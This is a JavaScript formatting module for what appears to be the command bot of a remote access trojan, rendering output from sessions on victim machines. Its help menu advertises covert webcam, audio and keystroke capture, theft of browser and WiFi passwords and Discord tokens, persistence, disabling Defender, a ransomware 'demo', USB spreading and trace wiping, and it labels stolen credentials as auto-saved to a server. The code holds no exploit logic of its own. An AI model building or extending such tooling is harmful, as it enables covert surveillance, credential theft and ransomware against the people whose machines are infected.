import chalk from 'chalk';
import moment from 'moment';

/**
 * Response Formatter - Makes everything look beautiful
 */

export class ResponseFormatter {
  
  /**
   * Format header with emoji and title
   */
  static header(emoji, title) {
    return `╔═══════════════════════════════════════╗
║ ${emoji} *${title.toUpperCase()}* ${emoji}
╚═══════════════════════════════════════╝`;
  }

  /**
   * Format success message
   */
  static success(message) {
    return `✅ *SUCCESS*\n\n${message}`;
  }

  /**
   * Format error message
   */
  static error(message) {
    return `❌ *ERROR*\n\n${message}`;
  }

  /**
   * Format info message
   */
  static info(message) {
    return `ℹ️ *INFO*\n\n${message}`;
  }

  /**
   * Format warning message
   */
  static warning(message) {
    return `⚠️ *WARNING*\n\n${message}`;
  }

  /**
   * Format system info response
   */
  static systemInfo(data) {
    const lines = data.split('\n');
    let formatted = this.header('💻', 'SYSTEM INFORMATION');
    formatted += '\n\n';
    
    lines.forEach(line => {
      if (line.includes(':')) {
        const [key, value] = line.split(':');
        formatted += `▪️ *${key.trim()}:*\n   ${value.trim()}\n\n`;
      }
    });
    
    formatted += `⏰ _Retrieved: ${moment().format('HH:mm:ss')}_`;
    return formatted;
  }

  /**
   * Format process list
   */
  static processList(data) {
    const lines = data.split('\n').slice(0, 20); // First 20 processes
    let formatted = this.header('⚙️', 'RUNNING PROCESSES');
    formatted += '\n\n';
    
    lines.forEach((line, idx) => {
      if (line.trim()) {
        formatted += `${idx + 1}. \`${line.trim()}\`\n`;
      }
    });
    
    formatted += `\n_Showing top 20 processes_`;
    return formatted;
  }

  /**
   * Format credentials (passwords, wifi, etc)
   */
  static credentials(data, type) {
    let formatted = this.header('🔐', `${type.toUpperCase()} CREDENTIALS`);
    formatted += '\n\n';
    
    try {
      const parsed = JSON.parse(data);
      
      if (Array.isArray(parsed)) {
        parsed.forEach((item, idx) => {
          formatted += `\n*[${idx + 1}]*\n`;
          Object.keys(item).forEach(key => {
            formatted += `▪️ *${key}:* ${item[key]}\n`;
          });
        });
      } else {
        formatted += '```' + JSON.stringify(parsed, null, 2) + '```';
      }
    } catch {
      formatted += '```' + data + '```';
    }
    
    formatted += `\n\n💾 _Auto-saved to server_`;
    return formatted;
  }

  /**
   * Format network scan results
   */
  static networkScan(data) {
    const hosts = data.split('\n').filter(l => l.trim());
    let formatted = this.header('🌐', 'NETWORK SCAN RESULTS');
    formatted += '\n\n';
    
    formatted += `📊 *Found ${hosts.length} hosts*\n\n`;
    
    hosts.forEach((host, idx) => {
      formatted += `${idx + 1}. \`${host}\`\n`;
    });
    
    return formatted;
  }

  /**
   * Format metrics/stats
   */
  static metrics(data) {
    let formatted = this.header('📊', 'SYSTEM METRICS');
    formatted += '\n\n';
    
    try {
      const parsed = JSON.parse(data);
      
      // CPU
      formatted += `🖥️ *CPU*\n`;
      formatted += `   Usage: ${parsed.CPU.percent}%\n`;
      formatted += `   Cores: ${parsed.CPU.count}\n\n`;
      
      // Memory
      formatted += `💾 *MEMORY*\n`;
      formatted += `   Total: ${parsed.Memory.total_gb} GB\n`;
      formatted += `   Used: ${parsed.Memory.used_gb} GB (${parsed.Memory.percent}%)\n\n`;
      
      // Disk
      formatted += `💿 *DISK*\n`;
      formatted += `   Total: ${parsed.Disk.total_gb} GB\n`;
      formatted += `   Used: ${parsed.Disk.used_gb} GB (${parsed.Disk.percent}%)\n\n`;
      
      // Network
      formatted += `🌐 *NETWORK*\n`;
      formatted += `   Sent: ${(parsed.Network.bytes_sent / 1024 / 1024).toFixed(2)} MB\n`;
      formatted += `   Received: ${(parsed.Network.bytes_recv / 1024 / 1024).toFixed(2)} MB\n\n`;
      
      formatted += `⏱️ *Uptime:* ${parsed.Uptime_Hours} hours`;
      
    } catch {
      formatted += '```' + data + '```';
    }
    
    return formatted;
  }

  /**
   * Format command executing status
   */
  static executing(command) {
    return `⏳ *EXECUTING COMMAND*\n\n\`${command}\`\n\n_Please wait..._`;
  }

  /**
   * Format session list
   */
  static sessionList(sessions) {
    let formatted = this.header('🎯', 'ACTIVE SESSIONS');
    formatted += '\n\n';
    
    if (sessions.length === 0) {
      formatted += '❌ No active sessions';
      return formatted;
    }
    
    sessions.forEach((session, idx) => {
      formatted += `\n*[${session.id}]* ${session.active ? '🟢' : '🔴'}\n`;
      formatted += `▪️ *Host:* ${session.addr}\n`;
      formatted += `▪️ *Info:* ${session.info}\n`;
      formatted += `▪️ *Connected:* ${session.connected_at}\n`;
    });
    
    formatted += `\n_Use /use <id> to interact_`;
    return formatted;
  }

  /**
   * Format help menu
   */
  static helpMenu() {
    let help = this.header('📱', 'COMMAND MENU');
    help += '\n\n';
    
    help += `*🎯 SESSION MANAGEMENT*
/sessions - List all active sessions
/use <id> - Switch to session
/kill <id> - Kill session
/active - Show current session

*💻 SYSTEM INFO*
/sysinfo - System information
/processes - Running processes
/metrics - Performance metrics
/software - Installed software
/usb - USB devices

*📸 SURVEILLANCE*
/screenshot - Capture screen
/webcam - Capture webcam
/keylogs - Get keystrokes
/record <sec> - Record audio
/clipboard - Clipboard logs

*🔐 CREDENTIALS*
/passwords - Browser passwords
/wifi - WiFi passwords
/discord - Discord tokens
/history <browser> - Browser history

*⚙️ PROCESS CONTROL*
/killproc <pid> - Kill process

*🌐 NETWORK*
/netscan - Scan network
/locate - Geolocation

*💾 FILES*
/download <path> - Download file
/upload <path> - Upload file

*📷 ADVANCED CAPTURE*
/timelapse <count> <interval> - Screenshot timelapse
/photoburst <count> - Multiple webcam photos
/usblist - List USB devices

*🎮 FUN FEATURES*
/msgbox <msg> - Show message
/beep [freq] [dur] - Play beep
/lock - Lock screen
/shutdown - Shutdown system
/restart - Restart system

*🛡️ PERSISTENCE*
/persist - Add persistence
/elevate - Get admin
/defenderoff - Disable Defender

*💣 ADVANCED*
/ransom <path> - Ransomware demo
/spread - USB spreading
/selfdestruct - Remove traces

*ℹ️ OTHER*
/help - Show this menu
/ping - Check bot status`;
    
    return help;
  }

  /**
   * Format network scan results
   */
  static networkScan(data) {
    let formatted = this.header('🌐', 'NETWORK SCAN RESULTS');
    formatted += '\n\n';
    
    try {
      const results = typeof data === 'string' ? data.split('\n') : data;
      const filtered = (Array.isArray(results) ? results : [results])
        .filter(r => r && r.trim())
        .slice(0, 20);
      
      if (filtered.length === 0) {
        formatted += '❌ No devices found on network';
      } else {
        formatted += `✅ Found ${filtered.length} active hosts:\n\n`;
        filtered.forEach((host, idx) => {
          formatted += `${idx + 1}. \`${host.trim()}\`\n`;
        });
      }
    } catch {
      formatted += '```' + data + '```';
    }
    
    return formatted;
  }

  /**
   * Console log with styling
   */
  static log(type, message) {
    const timestamp = moment().format('HH:mm:ss');
    
    switch(type) {
      case 'success':
        console.log(chalk.green(`[${timestamp}] ✓ ${message}`));
        break;
      case 'error':
        console.log(chalk.red(`[${timestamp}] ✗ ${message}`));
        break;
      case 'info':
        console.log(chalk.cyan(`[${timestamp}] ℹ ${message}`));
        break;
      case 'warning':
        console.log(chalk.yellow(`[${timestamp}] ⚠ ${message}`));
        break;
      default:
        console.log(chalk.white(`[${timestamp}] ${message}`));
    }
  }
}